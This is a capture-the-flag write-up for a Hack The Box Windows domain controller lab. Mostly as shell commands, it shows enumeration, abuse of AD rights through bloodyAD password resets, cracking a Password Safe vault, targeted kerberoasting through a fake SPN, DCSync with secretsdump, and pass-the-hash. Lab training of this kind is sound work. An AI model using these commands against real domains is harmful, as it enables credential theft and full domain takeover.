## About Administrator

**Name:** Administrator

**Machine:** https://app.hackthebox.com/machines/Administrator

**Difficulty:** Medium

**OS:** Windows

**Target IP:** 10.129.59.4

**Credentials:** `Olivia: ichliebedich`

---
## Recon

I'll start with an nmap scan to enumerate open ports, services, and versions:

```
$ nmap -sV -sC -oA Administrator -v 10.129.59.4

PORT     STATE SERVICE       VERSION                                                                                                                                
21/tcp   open  ftp           Microsoft ftpd                                                                                                                         
| ftp-syst:                                                                                                                                                         
|_  SYST: Windows_NT                                                                                                                                                
53/tcp   open  domain        Simple DNS Plus                                                                                                                        
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-09 17:54:03Z)                                                                         
135/tcp  open  msrpc         Microsoft Windows RPC                                
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                        
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)                                     
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?             
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                  
636/tcp  open  tcpwrapped            
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)                                     
3269/tcp open  tcpwrapped                                                                                                                                           
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found                                                           
|_http-server-header: Microsoft-HTTPAPI/2.0                                       
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

DNS, Kerberos, LDAP, SMB, and WinRM together confirm this is a domain controller. The domain is `administrator.htb`, and the hostname is `DC`. I'll add both to `/etc/hosts`.

![](Assets/2026-08-09_17-55.png)

## Enumeration

We're given a starting credential, `Olivia:ichliebedich`. I'll check what SMB shares this user can reach:

```
nxc smb 10.129.59.4 -u Olivia -p ichliebedich --shares
```

![](Assets/2026-08-09_16-35%201.png)

Nothing useful there, so I'll enumerate domain users instead:

```
nxc smb 10.129.59.4 -u Olivia -p ichliebedich --users | tee usernames.txt 
```

This gives a list of usernames to build the attack path from.

![](Assets/2026-08-09_16-43.png)

## Foothold

With a set of users identified, I'll pull data for `BloodHound`:

```
bloodhound-python -u olivia -p 'ichliebedich' -ns 10.129.59.4 -d administrator.htb -c all
zip -r administrator.zip *.json
```

I import the zip into BloodHound and mark `Olivia` as owned.

![](Assets/2026-08-09_17-04.png)

Checking her outbound object control, she holds `GenericAll` over the user `Michael`. `GenericAll` is essentially full control over an object. For a user account, that means I can reset the password directly, without knowing the current one.

![](Assets/2026-08-09_17-05.png)

I'll abuse this to reset `Michael`'s password with `bloodyAD`:

```
bloodyad --host administrator.htb -d administrator.htb -u Olivia -p ichliebedich set password "michael" pass@123
```

The new password authenticates successfully as `Michael`.

![](Assets/2026-08-09_17-15.png)

`Michael` is a member of `Remote Management Users`, so `WinRM` is available to him. I'll log in with `evil-winrm`.

![](Assets/2026-08-09_17-20.png)

We're in as `Michael`. Enumerating the filesystem turns up nothing interesting.

![](Assets/2026-08-09_17-24.png)

Back in BloodHound, `Michael` holds `ForceChangePassword` over the user `Benjamin`. Unlike `GenericAll`, `ForceChangePassword` only lets us reset the target's password, nothing more, but that's all that's needed here.

![](Assets/2026-08-09_17-23.png)

I'll reset the password with `bloodyAD` again:

```
bloodyad --host administrator.htb -d administrator.htb -u michael -p 'pass@123' set password "benjamin" password123
```

This gives control over `Benjamin`'s account.

![](Assets/2026-08-09_17-35.png)

`Benjamin` is a member of `Share Moderators`, which hints at access to file shares beyond standard SMB.

![](Assets/2026-08-09_18-23.png)

I try his credentials against FTP, and they work.

![](Assets/2026-08-09_18-26.png)

Browsing the FTP server, there's a file named `Backup.psafe3`. I'll download it for a closer look.

![](Assets/2026-08-09_18-27.png)

A `.psafe3` file is a Password Safe database, an encrypted vault holding multiple credentials behind one master password. If that master password cracks, every credential inside becomes usable. I'll extract a crackable hash from it and run it through John:

```
pwsafe2john Backup.psafe3 > psafe.hash
john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
```

This successfully cracks the master password: `tekieromucho`.

![](Assets/2026-08-09_18-39.png)

To actually open the vault, I need the actual Password Safe application, so I'll download and install it from [here](https://github.com/pwsafe/pwsafe/releases):

```
wget https://github.com/pwsafe/pwsafe/releases/download/1.25.0/passwordsafe-debian12-1.25-amd64.deb
sudo dpkg -i passwordsafe-debian12-1.25-amd64.deb 
```

I open `Backup.psafe3` in the application with the recovered master password.

![](Assets/2026-08-09_18-53.png)

Inside is a list of usernames matching the domain users found earlier. That's a strong sign this vault belongs to the domain and holds real, usable credentials.

![](Assets/2026-08-09_19-21.png)

Double-clicking each username copies its password to the clipboard. I go through and collect every username/password pair into a text file.

![](Assets/2026-08-09_19-42.png)

Testing these against the domain, only one pair works, for the user `emily`.

![](Assets/2026-08-09_19-44.png)

I connect via `evil-winrm` as `emily` and grab the user flag.

![](Assets/2026-08-09_19-47.png)

## Privilege Escalation

Back in BloodHound, `emily` holds `GenericWrite` over the user `ethan`.

![](Assets/2026-08-09_19-50.png)

GenericWrite lets us modify certain attributes on the target object, including `servicePrincipalName`. That means I can register a fake SPN on `ethan`'s account and make him kerberoastable, even though he wasn't originally.

Before any Kerberos attack, I need my clock synced with the DC, since Kerberos is time-sensitive:

```
date 
sudo timedatectl set-ntp off 
sudo rdate -n 10.129.59.4
```

With the clock aligned, I'll set a fake SPN on `ethan` using `emily`'s credentials:

```
bloodyad --host administrator.htb -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object ethan servicePrincipalName -v 'fake/kerberoast'
```

Now that `ethan` has an SPN, I can request his TGS ticket:

```
impacket-GetUserSPNs -dc-ip 10.129.59.4 administrator.htb/emily -request-user ethan -outputfile ethan_tgs
```

![](Assets/2026-08-09_20-05.png)

I crack the hash with John, which recovers `ethan`'s password: `limpbizkit`:

```
john --wordlist=/usr/share/wordlists/rockyou.txt ethan_tgs
```

![](Assets/2026-08-09_20-09.png)

Checking BloodHound again with `ethan`'s account, he holds `GetChanges`, `GetChangesAll`, and `GetChangesAll­InFilteredSet` rights over the domain itself.

![](Assets/2026-08-09_21-05.png)

Together, these three rights are exactly what's needed for a DCSync attack - essentially impersonating a domain controller and asking the real DC to replicate its password data over.

I'll use `secretsdump` to pull all NTLM hashes and Kerberos keys straight out of the NTDS database:

```
impacket-secretsdump -outputfile administrator_hashes -just-dc administartor.htb/ethan@10.129.59.4
```

This dump includes the NTLM hash for the `administrator` account itself.

![](Assets/2026-08-09_20-49.png)

With this hash, I authenticate directly as `administrator` via pass-the-hash and read the root flag.

![](Assets/2026-08-09_20-53.png)

---